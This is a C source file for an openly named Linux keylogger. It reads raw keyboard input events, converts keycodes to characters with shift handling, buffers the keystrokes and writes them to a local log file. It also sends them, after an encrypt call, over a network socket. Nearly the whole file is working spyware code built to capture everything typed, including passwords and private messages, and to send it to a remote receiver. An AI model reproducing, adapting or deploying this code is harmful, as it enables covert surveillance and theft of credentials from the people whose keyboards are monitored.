
#include "keylogger.h"
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <errno.h>
#include <strings.h>
#include <sys/select.h>
#include <unistd.h>
#include <linux/input.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <stdbool.h>


static char *KEYCODES[] = {
    "<unknown>", "<ESC>",
    "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
    "<Backspace>", "<Tab>",
    "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
    "[", "]", "<Enter>", "<LCtrl>",
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";",
    "'", "`", "<LShift>",
    "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
    "<RShift>",
    "<KP*>",
    "<LAlt>", " ", "<CapsLock>",
    "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
    "<NumLock>", "<ScrollLock>",
    "<KP7>", "<KP8>", "<KP9>",
    "<KP->",
    "<KP4>", "<KP5>", "<KP6>",
    "<KP+>",
    "<KP1>", "<KP2>", "<KP3>", "<KP0>",
    "<KP.>",
    "<unknown>", "<unknown>", "<unknown>",
    "<F11>", "<F12>",
    "<unknown>", "<unknown>", "<unknown>", "<unknown>", "<unknown>", "<unknown>", "<unknown>",
    "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", "<unknown>",
    "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
    "<PageDown>", "<Insert>", "<Delete>", 0x0
};

static char *SHIFT_KEYCODES[] = {
    "<unknown>", "<ESC>",
    "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+",
    "<Backspace>", "<Tab>",
    "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
    "{", "}", "<Enter>", "<LCtrl>",
    "A", "S", "D", "F", "G", "H", "J", "K", "L", ":",
    "\"", "~", "<LShift>",
    "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?",
    "<RShift>",
    "<KP*>",
    "<LAlt>", " ", "<CapsLock>",
    "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
    "<NumLock>", "<ScrollLock>",
    "<KP7>", "<KP8>", "<KP9>",
    "<KP->",
    "<KP4>", "<KP5>", "<KP6>",
    "<KP+>",
    "<KP1>", "<KP2>", "<KP3>", "<KP0>",
    "<KP.>",
    "<unknown>", "<unknown>", "<unknown>",
    "<F11>", "<F12>",
    "<unknown>", "<unknown>", "<unknown>", "<unknown>", "<unknown>", "<unknown>", "<unknown>",
    "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", "<unknown>",
    "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
    "<PageDown>", "<Insert>", "<Delete>", 0x0
};

static void send_log(int sockfd, int logfd, char *buffer, int len)
{
    if (!buffer || !(*buffer))
        return;
    if (logfd != -1)
        write(logfd, buffer, len);
    if (sockfd != -1) {
        write(sockfd, encrypt(buffer), len);
    }
}

static void log_single_keyboard(int kbfd, int sockfd, int logfd)
{
    static char *buffer = 0x0;
    static bool is_on_shift = false;
    int bytes_read = 0;
    int msg_length = 0;
    struct input_event evt;
    struct sigaction old;
    struct sigaction new = {
        .sa_handler = SIG_IGN,
        .sa_flags = 0
    };

    sigemptyset(&new.sa_mask);
    sigaction(SIGPIPE, &new, &old);
    do {

        bytes_read = read(kbfd, &evt, sizeof(struct input_event));
        if (bytes_read == -1) {
            break;
        } else is_on_shift = check_if_on_shift(is_on_shift, evt);

        if (evt.type == EV_KEY && evt.value == EV_KEY_PRESSED) {
            if (is_on_shift)
                buffer = append(buffer, SHIFT_KEYCODES[evt.code]);
            else buffer = append(buffer, KEYCODES[evt.code]);
        }

        if (buffer && strlen(buffer) >= BUFFER_SIZE) {
            msg_length = strlen(buffer);
            send_log(sockfd, logfd, buffer, msg_length);
            free(buffer);
            buffer = 0x0;
        }
    } while (bytes_read < 0);
    sigaction(SIGPIPE, &old, 0x0);

}

void log_keys(int *keyboards_fd, int sockfd, int logfd)
{
    int nb_kb = - 1;
    fd_set wrt;
    fd_set rd;
    fd_set err;
    int select_status = 0;

    while (keyboards_fd[++nb_kb] != -1);
    while (1) {
        refresh_set(&wrt, keyboards_fd);
        refresh_set(&rd, keyboards_fd);
        refresh_set(&err, keyboards_fd);
        select_status = select(nb_kb + 1, &rd, &wrt, &err, 0x0);
        if (select_status < 0) {
            dprintf(logfd, "select status:%d -- exiting...\n", select_status);
            break;
        }
        for (int ctr = -1 ; ++ctr < nb_kb; )
            if (FD_ISSET(keyboards_fd[ctr], &rd)) {
                log_single_keyboard(keyboards_fd[ctr], sockfd, logfd);
            }
    }
}
